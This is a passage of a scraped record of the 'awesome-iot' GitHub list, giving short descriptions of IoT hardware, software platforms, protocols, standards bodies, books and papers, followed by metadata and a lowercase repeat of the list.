Era.\nWaterstream - MQTT broker leveraging Apache Kafka as its own storage and distribution engine.\nNanoMQ - A light-weight and Blazing-fast MQTT Broker for IoT Edge platform.\nKuiper - An edge lightweight IoT data analytics/streaming software implemented by Golang, and it can be run at all kinds of resource-constrained edge devices.\nt6 - Data-first IoT platform to connect physical Objects with time-series DB and perform Data Analysis.\nLibraries and Tools\nCylon.js - Cylon.js is a JavaScript framework for robotics, physical computing, and the Internet of Things. It makes it incredibly easy to command robots and devices.\nLuvit - Luvit implements the same APIs as Node.js, but in Lua ! While this framework is not directly involved with IoT development, it is still a great way to rapidly build powerful, yet memory efficient, embedded web applications.\nJohnny-Five - Johnny-Five is the original JavaScript Robotics programming framework. Released by Bocoup in 2012, Johnny-Five is maintained by a community of passionate software developers and hardware engineers.\nPi4J - Pi4j is intended to provide a friendly object-oriented I/O API and implementation libraries for Java Programmers to access the full I/O capabilities of the Raspberry Pi platform.\nWiringPi - WiringPi is a GPIO access library written in C for the BCM2835 used in the Raspberry Pi.\nNode-RED - A visual tool for wiring the Internet of Things.\nMIMIC IoT Simulator - Simulate large IoT environments for agile development / testing / proof-of-concept / training of IoT Applications based on MQTT, CoAP, REST\nMQTT Explorer - Tool to visualize your MQTT topics in a topic hierarchy, a MQTT swiss-army knife.\nops - A free open source tool to build, run, and deploy linux applications as unikernels.\nSmartObject - A Smart Object Class that helps you with creating IPSO Smart Objects in your JavaScript applications. See also: IPSO Alliance Technical Archive.\nUnited Manufacturing Hub - The Open-Source Manufacturing App Platform (combines various open source solutions and packages them in a Helm chart, for example nodered, VerneMQ and timescaleDB)\nQuestDB - an open source time series database used for real-time analytics and high-performance applications. Supports high-throughput ingestion over InfluxDB line protocol and SQL as a query language.\nMiscellaneous\nAmazon Dash - Amazon Dash Button is a Wi-Fi connected device that reorders your favorite item with the press of a button.\nFreeboard - A real-time interactive dashboard and visualization creator implementing an intuitive drag & drop interface.\nNebula - A docker orchestrator designed to manage IoT devices.\nGladys - Gladys is an open-source program that runs on the Raspberry Pi and integrates into the entire home network system.\nProtocols and Networks\nPhysical layer\n- 802.15.4 (IEEE)\nIEEE 802.15.4 is a standard which specifies the physical layer and media access control for low-rate wireless personal area networks (LR-WPANs). It is maintained by the IEEE 802.15 working group, which has defined it in 2003. It is the basis for the ZigBee, ISA100.11a, WirelessHART, and MiWi specifications, each of which further extends the standard by developing the upper layers which are not defined in IEEE 802.15.4. Alternatively, it can be used with 6LoWPAN and standard Internet protocols to build a wireless embedded Internet. - Wikipedia\nIEEE standard 802.15.4 intends to offer the fundamental lower network layers of a type of wireless personal area network (WPAN) which focuses on low-cost, low-speed ubiquitous communication between devices. It can be contrasted with other approaches, such as Wi-Fi, which offer more bandwidth and require more power. The emphasis is on very low cost communication of nearby devices with little to no underlying infrastructure, intending to exploit this to lower power consumption even more.\n- Bluetooth (Bluetooth Special Interest Group)\nBluetooth is a wireless technology standard for exchanging data over short distances (using short-wavelength UHF radio waves in the ISM band from 2.4 to 2.485 GHz) from fixed and mobile devices, and building personal area networks (PANs). Invented by telecom vendor Ericsson in 1994, it was originally conceived as a wireless alternative to RS-232 data cables. It can connect several devices, overcoming problems of synchronization. - Wikipedia\nBluetooth is managed by the Bluetooth Special Interest Group (SIG), which has more than 25,000 member companies in the areas of telecommunication, computing, networking, and consumer electronics.\n- Bluetooth Low Energy (Bluetooth Special Interest Group)\nBluetooth low energy (Bluetooth LE, BLE, marketed as Bluetooth Smart) is a wireless personal area network technology designed and marketed by the Bluetooth Special Interest Group aimed at novel applications in the healthcare, fitness, beacons, security, and home entertainment industries. - Wikipedia\nCompared to Classic Bluetooth, Bluetooth Smart is intended to provide considerably reduced power consumption and cost while maintaining a similar communication range. The Bluetooth SIG predicts that by 2018 more than 90 percent of Bluetooth-enabled smartphones will support Bluetooth Smart.\nEC-GSM-IoT (EC-GSM-IoT Group)\nExtended coverage GSM IoT (EC-GSM-IoT) is a standard-based Low Power Wide Area technology. It is based on eGPRS and designed as a high capacity, long range, low energy and low complexity cellular system for IoT communications.\nThe EC-GSM-IOT network trials have begun, with the first commercial launches planned for 2017. Supported by all major mobile equipment, chip set and module manufacturers, EC-GSM-IoT networks will co-exist with 2G, 3G, and 4G mobile networks. It will also benefit from all the security and privacy mobile network features, such as support for user identity confidentiality, entity authentication, confidentiality, data integrity, and mobile equipment identification.\n- LoRaWAN (LoRa Alliance)\nA LoRaWAN wide area network allows low bit rate communication from and to connected objects, thus participating to Internet of Things, machine-to-machine M2M, and smart city. - Wikipedia\nThis technology is standardized by the LoRa Alliance. It was initially developed by Cycleo, which was acquired by Semtech in 2012. LoRaWAN is an acronym for Long Range Wide-area network.\nNB-IoT (3GPP)\nNarrowBand IoT (NB-IoT) is a Low Power Wide Area Network (LPWAN) radio technology standard that has been developed to enable a wide range of devices and services to be connected using cellular telecommunications bands. - Wikipedia\nNB-IoT is a narrowband radio technology designed for the Internet of Things (IoT), and is one of a range of Mobile IoT (MIoT) technologies standardized by the 3rd Generation Partnership Project (3GPP).\n- Sigfox (Sigfox)\nSigfox is a French firm that builds wireless networks to connect low-energy objects such as electricity meters, smart watches, and washing machines, which need to be continuously on and emitting small amounts of data. Its infrastructure is intended to be a contribution to what is known as the Internet of Things (IoT). - Wikipedia\nSIGFOX describes itself as \"the first and only company providing global cellular connectivity for the Internet of Things.\" Its infrastructure is \"completely independent of existing networks, such as telecommunications networks.\" SIGFOX seeks to provide the means for the \"deployment of billions of objects and thousands of new uses\" with the long-term goal of \"having petabytes of data produced by everyday objects\".\n- Wi-Fi (Wi-Fi Alliance)\nWi-Fi (or WiFi) is a local area wireless computer networking technology that allows electronic devices to network, mainly using the 2.4 gigahertz (12 cm) UHF and 5 gigahertz (6 cm) SHF ISM radio bands. - Wikipedia\nThe Wi-Fi Alliance defines Wi-Fi as any \"wireless local area network\" (WLAN) product based on the Institute of Electrical and Electronics Engineers' (IEEE) 802.11 standards.[1] However, the term \"Wi-Fi\" is used in general English as a synonym for \"WLAN\" since most modern WLANs are based on these standards. \"Wi-Fi\" is a trademark of the Wi-Fi Alliance. The \"Wi-Fi Certified\" trademark can only be used by Wi-Fi products that successfully complete Wi-Fi Alliance interoperability certification testing.\nNetwork / Transport layer\n- 6LowPan (IETF)\n6LoWPAN is an acronym of IPv6 over Low power Wireless Personal Area Networks. 6LoWPAN is the name of a concluded working group in the Internet area of the IETF. - Wikipedia\nThe 6LoWPAN concept originated from the idea that \"the Internet Protocol could and should be applied even to the smallest devices,\"and that low-power devices with limited processing capabilities should be able to participate in the Internet of Things. The 6LoWPAN group has defined encapsulation and header compression mechanisms that allow IPv6 packets to be sent and received over IEEE 802.15.4 based networks. IPv4 and IPv6 are the work horses for data delivery for local-area networks, metropolitan area networks, and wide-area networks such as the Internet. Likewise, IEEE 802.15.4 devices provide sensing communication-ability in the wireless domain. The inherent natures of the two networks though, are different.\n- Thread (Thread Group)\nThread is an IPv6 based protocol for \"smart\" household devices to communicate on a network.\nIn July 2014 Google Inc's Nest Labs announced a working group with the companies Samsung, ARM Holdings, Freescale, Silicon Labs, Big Ass Fans and the lock company Yale in an attempt to have Thread become the industry standard by providing Thread certification for products. Other protocols currently in use include ZigBee and Bluetooth Smart. Thread uses 6LoWPAN, which in turn uses the IEEE 802.15.4 wireless protocol with mesh communication, as does ZigBee and other systems. Thread however is IP-addressable, with cloud access and AES encryption. It supports over 250 devices on a network.\n- ZigBee (ZigBee Alliance)\nZigBee is a IEEE 802.15.4-based specification for a suite of high-level communication protocols used to create personal area networks with small, low-power digital radios. - Wikipedia\nThe technology defined by the ZigBee specification is intended to be simpler and less expensive than other wireless personal area networks (WPANs), such as Bluetooth or Wi-Fi. Applications include wireless light switches, electrical meters with in-home-displays, traffic management systems, and other consumer and industrial equipment that requires short-range low-rate wireless data transfer.\n- Z-Wave (Z-Wave Alliance)\nZ-Wave is a wireless communications specification designed to allow devices in the home (lighting, access controls, entertainment systems and household appliances, for example) to communicate with one another for the purposes of home automation. - Wikipedia\nZ-Wave technology minimizes power consumption so that it is suitable for battery-operated devices. Z-Wave is designed to provide, reliable, low-latency transmission of small data packets at data rates up to 100kbit/s, unlike Wi-Fi and other IEEE 802.11-based wireless LAN systems that are designed primarily for high data rates. Z-Wave operates in the sub-gigahertz frequency range, around 900 MHz.\nApplication layer\nCoAP (IETF)\nConstrained Application Protocol (CoAP) is a software protocol intended to be used in very simple electronics devices that allows them to communicate interactively over the Internet. - Wikipedia\nCoAP is particularly targeted for small low power sensors, switches, valves and similar components that need to be controlled or supervised remotely, through standard Internet networks. CoAP is an application layer protocol that is intended for use in resource-constrained internet devices, such as WSN nodes.\nDTLS (IETF)\nThe Datagram Transport Layer Security (DTLS) communications protocol provides communications security for datagram protocols. - Wikipedia\nDTLS allows datagram-based applications to communicate in a way that is designed[by whom?] to prevent eavesdropping, tampering, or message forgery. The DTLS protocol is based on the stream-oriented Transport Layer Security (TLS) protocol and is intended to provide similar security guarantees.\n- Eddystone (Google)\nEddystone is a beacon technology profile released by Google in July 2015. The open source, cross-platform software gives users location and proximity data via Bluetooth low-energy beacon format. - Wikipedia\nThough similar to the iBeacon released by Apple in 2013, Eddystone works on both Android and iOS, whereas iBeacon is limited to iOS platforms. A practical application of both softwares is that business owners can target potential customers based on the location of their smartphones in real time.\n- HTTP (IETF)\nThe Hypertext Transfer Protocol (HTTP) is an application protocol for distributed, collaborative, hypermedia information systems. HTTP is the foundation of data communication for the World Wide Web. - Wikipedia\nThe standards development of HTTP was coordinated by the Internet Engineering Task Force (IETF) and the World Wide Web Consortium (W3C), culminating in the publication of a series of Requests for Comments (RFCs). The first definition of HTTP/1.1, the version of HTTP in common use, occurred in RFC 2068 in 1997, although this was obsoleted by RFC 2616 in 1999.\n- iBeacon (Apple)\niBeacon is a protocol standardized by Apple and introduced at the Apple Worldwide Developers Conference in 2013. - Wikipedia\niBeacon uses Bluetooth low energy proximity sensing to transmit a universally unique identifier picked up by a compatible app or operating system. The identifier can be used to determine the device's physical location, track customers, or trigger a location-based action on the device such as a check-in on social media or a push notification.\n- MQTT (IBM)\nMQTT (formerly MQ Telemetry Transport) is a publish-subscribe based \"light weight\" messaging protocol for use on top of the TCP/IP protocol. It is designed for connections with remote locations where a \"small code footprint\" is required or the network bandwidth is limited. - Wikipedia\nThe publish-subscribe messaging pattern requires a message broker. The broker is responsible for distributing messages to interested clients based on the topic of a message. Andy Stanford-Clark and Arlen Nipper of Cirrus Link Solutions authored the first version of the protocol in 1999.\n- PJON\nPJON\u00ae (Padded Jittering Operative Network) is an Arduino compatible, multi-master, multi-media network protocol. It proposes a Standard, it is designed as a framework and implements a totally software emulated network protocol stack that can be easily cross-compiled on many architectures like ATtiny, ATmega, ESP8266, ESP32, STM32, Teensy, Raspberry Pi, Linux, Windows x86 and Apple machines. It is a valid tool to quickly and comprehensibly build a network of devices. Visit wiki and documentation to know more about the PJON Standard.\nPJON is used in thousands of devices and its community has spread worldwide because of the following 6 key factors: New technology, Multi-media support, Increased security, Increased reliability, High flexibility and Low cost.\n- STOMP\nSimple (or Streaming) Text Oriented Message Protocol (STOMP), formerly known as TTMP, is a simple text-based protocol, designed for working with message-oriented middleware (MOM). - Wikipedia\nSTOMP provides an interoperable wire format that allows STOMP clients to talk with any message broker supporting the protocol. It is thus language-agnostic, meaning a broker developed for one programming language or platform can receive communications from client software developed in another language.\n- Websocket\nWebSocket is a protocol providing full-duplex communication channels over a single TCP connection. - Wikipedia\nWebSocket is designed to be implemented in web browsers and web servers, but it can be used by any client or server application. The WebSocket Protocol is an independent TCP-based protocol. The WebSocket protocol makes more interaction between a browser and a website possible, facilitating live content and the creation of real-time games. This is made possible by providing a standardized way for the server to send content to the browser without being solicited by the client, and allowing for messages to be passed back and forth while keeping the connection open.\n- XMPP (IETF)\nExtensible Messaging and Presence Protocol (XMPP) is a communications protocol for message-oriented middleware based on XML (Extensible Markup Language). - Wikipedia\nIt enables the near-real-time exchange of structured yet extensible data between any two or more network entities. Designed to be extensible, the protocol has also been used for publish-subscribe systems, signalling for VoIP, video, file transfer, gaming, Internet of Things (IoT) applications such as the smart grid, and social networking services.\nTechnologies\nThis sections regroups a curated list of awesome technologies that are closely related to the IoT world.\n- NFC\nNear field communication (NFC) is the set of protocols that enable electronic devices to establish radio communication with each other by touching the devices together, or bringing them into proximity to a distance of typically 10cm or less. - Wikipedia\n- OPCUA\nOPC-UA is a not only a protocol for industrial automation but also a technology that allows semantic description and object modelling of industrial environment. Wikipedia\nStandards and Alliances\nStandards\nETSI M2M - The ETSI Technical Committee is developing standards for Machine to Machine Communications.\nOneM2M - The purpose and goal of oneM2M is to develop technical specifications which address the need for a common M2M Service Layer that can be readily embedded within various hardware and software, and relied upon to connect the myriad of devices in the field with M2M application servers worldwide.\nOPCUA - OPC Unified Architecture (OPC UA) is an industrial M2M communication protocol for interoperability developed by the OPC Foundation.\nOCF - OCF, The Open Connectivity Foundation, develop standards and certification for devices involved in the Internet of Things (IoT) based around Constrained Application Protocol (CoAP).\nW3C WoT - The W3C Working Group for the Web of Things (WoT) seeks to counter the fragmentation of the IoT by using and extending existing, standardized Web technologies. By providing standardized metadata and other re-usable technological building blocks, W3C WoT enables easy integration across IoT platforms and application domains.\nAlliances\nAIOTI - The Internet of Things Innovation (AIOTI) aims to strengthen links and build new relationships between the different IoT players (industries, SMEs, startups) and sectors.\nBluetooth Special Interest Group - The Bluetooth Special Interest Group (SIG) is the body that oversees the development of Bluetooth standards and the licensing of the Bluetooth technologies and trademarks to manufacturers.\nIPSO Alliance - The IPSO Alliance provides a foundation for industry growth by fostering awareness, providing education, promoting the industry, generating research, and creating a better understanding of IP and its role in the Internet of Things.\nLoRa Alliance - The LoRa Alliance is an open, non-profit association of members that believes the internet of things era is now. It was initiated by industry leaders with a mission to standardize Low Power Wide Area Networks (LPWAN) being deployed around the world to enable Internet of Things (IoT), machine-to-machine (M2M), and smart city, and industrial applications.\nOPC Foundation - The mission of the OPC Foundation is to manage a global organization in which users, vendors and consortia collaborate to create data transfer standards for multi-vendor, multi-platform, secure and reliable interoperability in industrial automation. To support this mission, the OPC Foundation creates and maintains specifications, ensures compliance with OPC specifications via certification testing and collaborates with industry-leading standards organizations.\nThread Group - The Thread Group, composed of members from Nest, Samsung, ARM, Freescale, Silicon Labs, Big Ass Fans and Yale, drives the development of the Thread network protocol.\nWi-Fi Alliance - Wi-Fi Alliance\u00ae is a worldwide network of companies composed of several companies forming a global non-profit association with the goal of driving the best user experience with a new wireless networking technology \u2013 regardless of brand.\nZigbee Alliance - The ZigBee Alliance is an open, non-profit association of approximately 450 members driving development of innovative, reliable and easy-to-use ZigBee standards.\nZ-Wave Alliance - Established in 2005, the Z-Wave Alliance is comprised of industry leaders throughout the globe that are dedicated to the development and extension of Z-Wave as the key enabling technology for 'smart' home and business applications.\nResources\nBooks\nAbusing the Internet of Things: Blackouts, Freakouts, and Stakeouts (2015) by Nitesh Dhanjani [5.0]\nfuture with billions of connected \"things\" includes monumental security concerns. This practical book explores how malicious attackers can abuse popular IoT-based devices, including wireless LED lightbulbs, electronic door locks, baby monitors, smart TVs, and connected cars.\nBuilding Wireless Sensor Networks: with ZigBee, XBee, Arduino, and Processing (2011) by Robert Faludi [4.5]\nGet ready to create distributed sensor systems and intelligent interactive devices using the ZigBee wireless networking protocol and Series 2 XBee radios. By the time you're halfway through this fast-paced, hands-on guide, you'll have built a series of useful projects, including a complete ZigBee wireless network that delivers remotely sensed data.\nDesigning the Internet of Things (2013) by Adrian McEwen and Hakim Cassimally [4.0]\nWhether it's called physical computing, ubiquitous computing, or the Internet of Things, it's a hot topic in technology: how to channel your inner Steve Jobs and successfully combine hardware, embedded software, web services, electronics, and cool design to create cutting-edge devices that are fun, interactive, and practical. If you'd like to create the next must-have product, this unique book is the perfect place to start.\nGetting Started with Bluetooth Low Energy: Tools and Techniques for Low-Power Networking (2014) by Kevin Townsend, Carles Cuf\u00ed, Akiba and Robert Davidson [4.5]\nThis book provides a solid, high-level overview of how devices use Ble to communicate with each other. You'll learn useful low-cost tools for developing and testing Ble-enabled mobile apps and embedded firmware and get examples using various development platforms including iOs and Android for app developers and embedded platforms for product designers and hardware engineers.\nSmart Things: Ubiquitous Computing User Experience Design (2010) by Mike Kuniavsky [4.5]\nSmart Things presents a problem-solving approach to addressing designers' needs and concentrates on process, rather than technological detail, to keep from being quickly outdated. It pays close attention to the capabilities and limitations of the medium in question and discusses the tradeoffs and challenges of design in a commercial environment.\nJavaScript on Things: Hardware for Web Developers (2018 - est.) by Lyza Danger Gardner [early access book]\nJavaScript on Things is your first step into the exciting and downright entertaining world of programming for small electronics. If you know enough JavaScript to hack a website together, you'll be making things bleep, blink and spin faster than you can say \"nodebot\". This fully-illustrated, hands-on book shows you how to get going with platforms like Arduino, Tessel, and Raspberry Pi.\nArticles\nA Simple Explanation Of 'The Internet Of Things' (Forbes) - This article attemps to give an answer to what exactly is the \u201cInternet of things\u201d and what impact it is going to have on us.\nIoT security. Is there an app for that ? - The Internet of Things World conference investigates IoT application development, security, and business models.\nThe IoT Testing Atlas - A testing methodology for managing the permutations of parameters while testing an IoT based product.\nHow to begin with the Amazon Timestream - A step-by-step guide to AWS Timestream - a time series database to collect IoT data over-time.\nPapers\nA Reference Architecture for the Internet of Things - This white paper introduces a Reference Architecture for the Internet of Things (IoT): this includes the devices as well as the server-side and cloud architecture required to interact with and manage the devices.\nDeveloping solutions for the Internet of Things - Intel's vision in enabling secure and seamless solutions for the Internet of Things (IoT).\nEvaluation of indoor positioning based on Bluetooth Smart technology - Master of Science Thesis in the Programme Computer Systems and Networks.\nIoT: A Vision, Architectural Elements, and Future Directions - This paper presents a cloud centric vision for worldwide implementation of Internet of Things. The key enabling technologies and application domains that are likely to drive IoT research in the near future are discussed.\nRealizing the Potential of the Internet of Things - A white paper from the Telecommunications Industry Association (TIA) written in the form of a set of recommendations to policy maker on leveraging and realizing the potential of the Internet of Things market.\nThe Internet of Things: Evolution or Revolution ? - This white paper compares the current Internet of Things market rise to other industrial revolutions, the challenges it introduces, as well as its consequences on our daily lives.\nLicense\nTo the extent possible under law, Halim Qarroum has waived all copyright and related or neighboring rights to this work.", "link": "https://github.com/HQarroum/awesome-iot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome iot\na curated list of awesome internet of things projects and resources.\ninspired by the awesome list thing.\ntable of contents\nhardware\nsoftware\noperating systems\nprogramming languages\nframeworks\nmiddlewares\nlibraries and tools\nmiscellaneous\nprotocols and networks\ntechnologies\nstandards and alliances\nresources\nbooks\narticles\npapers\nhardware\narduino - arduino is an open-source electronics platform based on easy-to-use hardware and software. it's intended for anyone making interactive projects.\nbeagleboard - the beagleboard is a low-power open-source hardware single-board computer produced by texas instruments in association with digi-key and newark element14.\ndragonboard - the dragonboard 410c, a product of arrow electronics, is the development board based on the mid-tier qualcomm\u00ae snapdragon\u2122 410e processor. it features advanced processing power, wi-fi, bluetooth connectivity, and gps, all packed into a board the size of a credit card.\nesp32 - esp32, the successor to the esp8266. esp32 is power packed with hardware features. the high speed dual core processors along with the numerous built in peripherals it is set to replace micro-controllers in connected products.\nhummingboard - hummingboard is a family of three linux- and android-ready, open source sbcs based on 1ghz freescale i.mx6 socs, with a pi-like 26-pin i/o connector.\nintel galileo - the intel\u00ae galileo gen 2 board is the first in a family of arduino*-certified development and prototyping boards based on intel\u00ae architecture and specifically designed for makers, students, educators, and diy electronics enthusiasts.\nmicroduino - microduino and mcookie bring powerful, small, stackable electronic hardware to makers, designers, engineers, students and curious tinkerers of all ages. build open-source projects or create innovative new ones.\nnode mcu (esp 8266) - nodemcu is an open source iot platform. it uses the lua scripting language. it is based on the elua project, and built on the esp8266 sdk 0.9.5.\nolinuxino - olinuxino is an open source software and open source hardware low cost (eur 30) linux industrial grade single board computer with gpios capable of operating from -25\u00b0c to +85\u00b0c.\nodroid - the odroid means open + droid. it is a development platform for the hardware as well as the software.\nparticle - a suite of hardware and software tools to help you prototype, scale, and manage your internet of things products.\npinoccio - pinoccio is a solution to add mesh networking capability and wifi-internet access to all yout iot devices, and it is arduino compatible.\nraspberry pi - the raspberry pi is a low cost, credit-card sized computer that plugs into a computer monitor or tv, and uses a standard keyboard and mouse. it\u2019s capable of doing everything you\u2019d expect a desktop computer to do, from browsing the internet and playing high-definition video, to making spreadsheets, word-processing, and playing games.\ntessel - tessel is a completely open source and community-driven iot and robotics development platform. it encompases development boards, hardware module add-ons, and the software that runs on them.\nudoo - udoo is a single-board computer with an integrated arduino 2 compatible microcontroller, designed for computer science education, the world of makers and the internet of things.\nsoftware\noperating systems\napache mynewt - apache mynewt is a real-time, modular operating system for connected iot devices that need to operate for long periods of time under power, memory, and storage constraints. the first connectivity stack offered is ble 4.2.\narm mbed - the arm\u00ae mbed\u2122 iot device platform provides the operating system, cloud services, tools and developer ecosystem to make the creation and deployment of commercial, standards-based iot solutions possible at scale.\ncontiki - contiki is an open source operating system for the internet of things. contiki connects tiny low-cost, low-power microcontrollers to the internet.\nfreertos - freertos is a popular real-time operating system kernel for embedded devices, that has been ported to 35 microcontrollers.\nandroid things - android things extends the android platform to all your connected devices, so they are easy to set up and work seamlessly with each other and your smartphone.\nopenwrt - openwrt is an operating system (in particular, an embedded operating system) based on the linux kernel, primarily used on embedded devices to route network traffic. the main components are the linux kernel, util-linux, uclibc or musl, and busybox. all components have been optimized for size, to be small enough for fitting into the limited storage and memory available in home routers.\nsnappy ubuntu - snappy ubuntu core is a new rendition of ubuntu with transactional updates. it provides a minimal server image with the same libraries as today\u2019s ubuntu, but applications are provided through a simpler mechanism.\nmbed os - open-source operating system for internet of things (iot) cortex-m boards: low-powered, constrained and connected. mbed os provides an abstraction layer for the microcontrollers it runs on, so that developers can write c/c++ applications that run on any mbed-enabled board.\nnodeos - nodeos is an operating system entirely written in javascript, and managed by npm on top of the linux kernel.\nraspbian - raspbian is a free operating system based on debian optimized for the raspberry pi hardware.\nriot - the friendly operating system for the internet of things.\ntiny os - tinyos is an open source, bsd-licensed operating system designed for low-power wireless devices, such as those used in sensor networks, ubiquitous computing, personal area networks, smart buildings, and smart meters.\nubos - ubos is a linux distro that focuses on making systems administration of home servers and indie iot devices running web applications much simpler. a derivative of arch linux, it runs on pcs, raspberry pis, espressobin, and cloud.\nwindows 10 iot core - windows 10 iot is a family of windows 10 editions targeted towards a wide range of intelligent devices, from small industrial gateways to larger more complex devices like point of sales terminals and atms.\nzephyr project - the zephyr\u2122 project is a scalable real-time operating system (rtos) supporting multiple hardware architectures, optimized for resource constrained devices, and built with security in mind.\nprogramming languages\nthis sections regroups every awesome programming language, whether it is compiled, interpreted or a dsl, related to embedded development.\nc - a general-purpose, imperative computer programming language, supporting structured programming, lexical variable scope and recursion, while a static type system prevents many unintended operations.\nc++ - a general-purpose programming language. it has imperative, object-oriented and generic programming features, while also providing facilities for low-level memory manipulation.\ngroovy - groovy is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities, for the java platform aimed at multiplying developers\u2019 productivity thanks to a concise, familiar and easy to learn syntax. it is used by the smartthings development environment to create smart applications.\nlua - lua is a powerful, fast, lightweight, embeddable scripting language. lua is dynamically typed, runs by interpreting bytecode for a register-based virtual machine, and has automatic memory management with incremental garbage collection, making it ideal for configuration, scripting, and rapid prototyping.\nelua - elua stands for embedded lua and the project offers the full implementation of the lua programming language to the embedded world, extending it with specific features for efficient and portable software embedded development.\nelfe - elfe is a very simple and small programming language. while it is a general-purpose programming language, it is specifically tuned to facilitate the configuration and control of swarms of small devices such as sensors or actuators.\nmicropython - a lean and efficient python implementation for microcontrollers and constrained systems\npharothings - live programming platform for iot projects based on pharo (a pure object-oriented programming language and a powerful environment, focused on simplicity and immediate feedback).\nrust - rust is a language focused on performance, reliability and productivity. it is known for its safety, it is memory safe, it uses a borrow checker, and concurrency is also safe.\ntinygo - tinygo is a project to bring the go programming language to microcontrollers and modern web browsers by creating a new compiler based on llvm. you can compile and run tinygo programs on many different microcontroller boards such as the bbc micro:bit and the arduino uno.\nframeworks\nalljoyn - alljoyn is an open source software framework that makes it easy for devices and apps to discover and communicate with each other.\napple homekit - homekit is a framework for communicating with and controlling connected accessories in a user\u2019s home.\nareg sdk - areg sdk is an interface-centric real-time asynchronous communication engine to enable distributed- and mist-computing, where connected things interact and provide services, as if they act like thin distributed servers.\nastarte - astarte is an open source iot platform written in elixir. it is a turnkey solution which packs in everything you need for connecting a device fleet to a set of remote applications. it performs data modeling, automated data reduction, real-time events, and provides you with any feature you might expect in a modern iot platform. right now, linux and esp32 devices are supported out of the box using the provided sdks.\nblynk - blynk is a platform for creating ios and android apps for connected things. you can easily build graphic interfaces for all your projects by simply dragging and dropping widgets (right on the smartphone). supports ethernet, wifi, bluetooth, gsm/gprs, usb/serial connections with wide range of prototyping platforms from arduino, raspberry, arm mbed, particle, redbear, etc.\ncountly iot analytics - countly is a general purpose analytics platform for mobile and iot devices, available as open source.\neclipse ditto\u2122 - eclipse ditto is a framework for building so called \"digital twins\". it provides a cloud based representation and apis to interact with connected physical devices. ditto provides built-in authorization, search and connectivity capabilities to integrate with foreign systems like mqtt brokers, http endpoints and apache kafka.\neclipse smarthome - the eclipse smarthome framework is designed to run on embedded devices, such as a raspberry pi, a beaglebone black or an intel edison. it requires a java 7 compliant jvm and an osgi (4.2+) framework, such as eclipse equinox.\nfreedomotic - freedomotic is an open source, flexible, secure internet of things (iot) development framework, useful to build and manage modern smart spaces. it is targeted to private individuals (home automation) as well as business users (smart retail environments, ambient aware marketing, monitoring and analytics, etc). written in java, it can interact with well known standard building automation protocols as well as with \"do it yourself\" solutions.\niotivity - iotivity is an open source software framework enabling seamless device-to-device connectivity to address the emerging needs of the internet of things.\nkura - kura aims at offering a java/osgi-based container for m2m applications running in service gateways. kura provides or, when available, aggregates open source implementations for the most common services needed by m2m applications.\nlelylan - lelylan is an iot cloud platform based on a lightweight microservices architecture. the lelylan platform is both hardware-agnostic and platform-agnostic. this means that you can connect any hardware, from the esp8266 to the most professional embedded hardware solution and everything in between - and it can run on any public cloud, your own private datacenter, or even in a hybrid environment, whether virtualized or bare metal.\nmacchina.io - macchina.io edge is a rich software framework for quickly building iot device applications running on linux-based devices. macchina.io edge implements a web-enabled, secure, modular and extensible javascript and c++ runtime environment and provides ready-to-use and industry proven software building blocks. these enable devices to talk to various sensors, other devices and cloud services, and to process, analyze and filter sensor data locally, at the edge device or within the local network.\nmihini - the main goal of mihini is to deliver an embedded runtime running on top of linux, that exposes high-level api for building m2m applications. mihini aims at enabling easy and portable development, by facilitating access to the i/os of an m2m system, providing a communication layer, etc.\nopenhab - the openhab runtime is a set of osgi bundles deployed on an osgi framework (equinox). it is therefore a pure java solution and needs a jvm to run. being based on osgi, it provides a highly modular architecture, which even allows adding and removing functionality during runtime without stopping the service.\ngobot - gobot is a framework for robotics, physical computing, and the internet of things, written in the go programming language.\nhome assistant - home assistant is a home automation platform running on python 3. the goal of home assistant is to be able to track and control all devices at home and offer a platform for automating control.\nlightweight mqtt machine network - lwmqn is an open source project that follows part of oma lwm2m v1.0 specification and uses the ip-base smart object model to meet the minimum requirements of machine network management. it provides both server-side and machine-side libraries to make full-stack iot development possible with javascript and node.js. see also: ipso alliance technical archive.\nthingsboard iot gateway - open-source iot gateway - integrates devices connected to legacy and third-party systems with thingsboard iot platform using opc-ua and mqtt protocols.\npimatic - pimatic is a home automation framework that runs on node.js. it provides a common extensible platform for home control and automation tasks.\niota - open-source distributed ledger protocol for iot. uses a directed acyclic graph (dag) instead of a blockchain.\nmycontroller - the open source controller. mycontroller.org is an iot automation controller for home, office or any place.\nmozilla webthings - an open platform for monitoring and controlling devices over the web.\nhstreamdb - the streaming database built for iot data storage and real-time processing.\nmiddlewares\ncorlysis - corlysis is a platform that helps you with storing and visualizing your time-series data. it is based on the open-source projects grafana and influxdb that also spacex uses.\nifttt - ifttt is a web-based service that allows users to create chains of simple conditional statements, called \"recipes\", which are triggered based on changes to other web services such as gmail, facebook, instagram, and pinterest. ifttt is an abbreviation of \"if this then that\" (pronounced like \"gift\" without the \"g\").\nopc router - iot gateway with various plug-ins (opc ua, mqtt, sql, rest, sap, influxdb, printer, ...)\nhuginn - huginn is a system for building agents that perform automated tasks for you online.\nkaa - an open-source middleware platform for rapid creation of iot solutions.\nlosant - losant is an easy-to-use and powerful developer platform designed to help you quickly and securely build complex connected solutions. losant uses open communication standards like rest and mqtt to provide connectivity from one to millions of devices. losant provides powerful data collection, aggregation, and visualization features to help understand and quantify vast amounts of sensor data. losant's drag-and-drop workflow editor allows you to trigger actions, notifications, and machine-to-machine communication without programming.\nmicroservicebus.com - microservicebus.com is a device management platform for azure, aws and ibm iot hub, with integration to github, servicenow, cisco jasper and more. it comes in a free (limited) version along with enterprise offerings.\ndreamfactory - dreamfactory is a free open source rest api platform for mobile, web and iot applications.\nhivemq - enterprise ready mqtt broker that can scale to connect millions of iot devices.\ni1820 - i1820 is a free open source platform which provides discovery, data collection and configuration services based on mqtt. i1820 implements a rest api for controlling the things and it stores all collected data in a time-series database named influxdb.\niostash - iostash is a high performance iot platform that is free for diy developers and non profit applications. it has multiple connectivity options and enables easy development of m2m or m2a applications. iostash offers nodejs and android libraries for easy application creation.\nthingsboard - an open-source iot platform. device management, data collection, processing and visualization for your iot solution.\nthingspeak - an open-source iot analytics platform service that allows you to aggregate, visualize, and analyze live data streams in the cloud. you can send data to thingspeak from your devices, create instant visualization of live data, and send alerts.\nvernemq - vernemq is a high-performance, distributed mqtt broker that connects iot, m2m, mobile, and web applications. it scales horizontally and vertically on commodity hardware to support a high number of concurrent publishers and consumers while maintaining low latency and fault tolerance.\nkuzzle - an open-source backend with advanced features like real-time pub/sub or geofencing and a 